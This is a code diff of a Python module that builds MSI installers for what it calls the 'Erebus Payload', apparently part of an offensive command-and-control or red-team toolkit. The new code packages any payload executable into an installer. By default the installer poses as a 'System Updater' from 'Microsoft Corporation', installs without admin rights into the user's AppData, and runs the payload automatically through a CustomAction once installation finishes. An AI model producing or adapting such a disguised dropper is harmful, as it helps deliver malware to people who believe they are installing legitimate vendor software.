@@ -1,58 +1,112 @@
-"""Generates an MSI Container using msitools
-
-Returns:
-    pathlib.Path: path to the finished MSI
 """
-import json, pathlib, uuid, shutil, subprocess, tempfile
+MSI Container Generator for Erebus Payload
+Features:
+- Admin (Machine) vs User (No-Admin) install scopes
+- Auto-execution via CustomAction
+- Dependency bundling
+"""
 
-REPO_ROOT     = pathlib.Path(__file__).resolve().parents[2]
-AGENT_CODE    = REPO_ROOT / "agent_code"
-CONTAINER_DIR = AGENT_CODE / "container"
-PAYLOAD_DIR   = AGENT_CODE / "payload"
+import pathlib
+import subprocess
+import uuid
+import tempfile
 
-def build_msi(spec_name: str = "spec.json", out_dir_name: str = "msi") -> pathlib.Path:
-    """Generates an MSI Container
 
-    Args:
-        spec_name (str): JSON spec inside container/ (default: spec.json)
-        out_dir_name (str): temp staging dir name (default: msi)
-
-    Returns:
-        pathlib.Path: absolute path to the new .msi file
+def build_msi(build_path: pathlib.Path,
+              app_name: str = "System Updater",
+              manufacturer: str = "Microsoft Corporation",
+              install_scope: str = "User") -> pathlib.Path:
     """
-    spec_path = CONTAINER_DIR / spec_name
-    with open(spec_path) as f:
-        spec = json.load(f)
+    Wraps the payload into an MSI.
+    
+    Args:
+        app_name (str): Name of the Application
+        manufacturer (str): Name of the manufacturer
+        install_scope (str): "User" (No Admin, AppData) or "Machine" (Admin, ProgramFiles)
+    """
+    version = "1.0.0.0"
+    upgrade_code = str(uuid.uuid4())
+    component_guid = str(uuid.uuid4())
+    
+    payload_dir = build_path / "payload"
+    payload_exe = payload_dir / "erebus.exe"
+    if not payload_exe.exists():
+        try:
+            payload_exe = next(p for p in payload_dir.iterdir() if p.is_file() and p.suffix.lower() == ".exe")
+        except StopIteration:
+            raise RuntimeError("No .exe payload found in payload directory!")
 
-    stage = CONTAINER_DIR / out_dir_name
-    shutil.rmtree(stage, ignore_errors=True)
-    stage.mkdir()
+    msi_path = build_path / "container" / "msi" / "erebus.msi"
+    msi_path.parent.mkdir(parents=True, exist_ok=True)
+    
+    if install_scope.lower() == "machine":
+        target_dir_id = "ProgramFilesFolder"
+        package_scope = 'InstallScope="perMachine"'
+        root_dir_name = "SourceDir"
+    else:
+        target_dir_id = "LocalAppDataFolder" 
+        package_scope = 'InstallScope="perUser"'
+        root_dir_name = "SourceDir"
 
-    for dst, src in spec["files"].items():
-        shutil.copy2(AGENT_CODE / src, stage / dst)
-    shutil.copy2(PAYLOAD_DIR / spec["payload_name"], stage / spec["payload_name"])
+    files_xml = ""
+    main_exe_id = "PayloadEXE"
+    
+    for file in payload_dir.iterdir():
+        if file.is_file() and file.name != msi_path.name:
+            file_id = f"File_{uuid.uuid4().hex[:8]}"
+            is_main = (file.name == payload_exe.name)
+            
+            if is_main:
+                current_id = main_exe_id
+                keypath = ''
+            else:
+                current_id = file_id
+                keypath = ''
 
-    files = [p for p in PAYLOAD_DIR.iterdir() if p.is_file() and p.suffix != ".msi"]
-    if not files:
-        raise ValueError("No files found in payload/ to pack")
+            files_xml += f'<File Id="{current_id}" Source="{file.absolute()}" {keypath} />\n'
 
-    wix_json = {
-        "name": spec["name"],
-        "version": spec["version"],
-        "manufacturer": spec["author"],
-        "upgrade_code": str(uuid.uuid4()),
-        "files": [{"source": str(f), "name": f.name} for f in files],
-    }
+    wix_xml = f"""<?xml version="1.0" encoding="utf-8"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+    <Product Id="*" UpgradeCode="{upgrade_code}" Name="{app_name}" Version="{version}" Manufacturer="{manufacturer}" Language="1033">
+        <Package InstallerVersion="200" Compressed="yes" Comments="Installer" {package_scope} />
+        <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />
 
-    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as tmp:
-        json.dump(wix_json, tmp)
-        tmp_name = tmp.name
+        <Directory Id="TARGETDIR" Name="{root_dir_name}">
+            <Directory Id="{target_dir_id}">
+                <Directory Id="INSTALLLOCATION" Name="{app_name}">
+                    <Component Id="MainComponent" Guid="{component_guid}">
+                        <!-- Critical for Per-User installs to create the folder key -->
+                        <RegistryValue Root="HKCU" Key="Software\\{manufacturer}\\{app_name}" Name="installed" Type="integer" Value="1" KeyPath="yes"/>
+                        {files_xml}
+                    </Component>
+                </Directory>
+            </Directory>
+        </Directory>
 
-    msi_path = CONTAINER_DIR / spec["msi_name"]
+        <Feature Id="ProductFeature" Title="{app_name}" Level="1">
+            <ComponentRef Id="MainComponent" />
+        </Feature>
+
+        <CustomAction Id="LaunchApp" FileKey="{main_exe_id}" ExeCommand="" Return="asyncNoWait" />
+        
+        <InstallExecuteSequence>
+            <Custom Action="LaunchApp" After="InstallFinalize">NOT Installed</Custom>
+        </InstallExecuteSequence>
+    </Product>
+</Wix>
+"""
 
     try:
-        subprocess.check_call(["wixl", "-o", str(msi_path), tmp_name])
-    finally:
-        pathlib.Path(tmp_name).unlink(missing_ok=True)
+        with tempfile.TemporaryDirectory() as temp_dir:
+            wxs_path = pathlib.Path(temp_dir) / "installer.wxs"
+            wxs_path.write_text(wix_xml, encoding="utf-8")
+            
+            cmd = ["wixl", "-o", str(msi_path), str(wxs_path)]
+            subprocess.check_output(cmd, stderr=subprocess.STDOUT)
+            
+            if not msi_path.exists():
+                raise RuntimeError("MSI file was not created.")
+            return msi_path
 
-    return msi_path
+    except subprocess.CalledProcessError as e:
+        raise RuntimeError(f"MSI Build Failed:\n{e.output.decode()}")
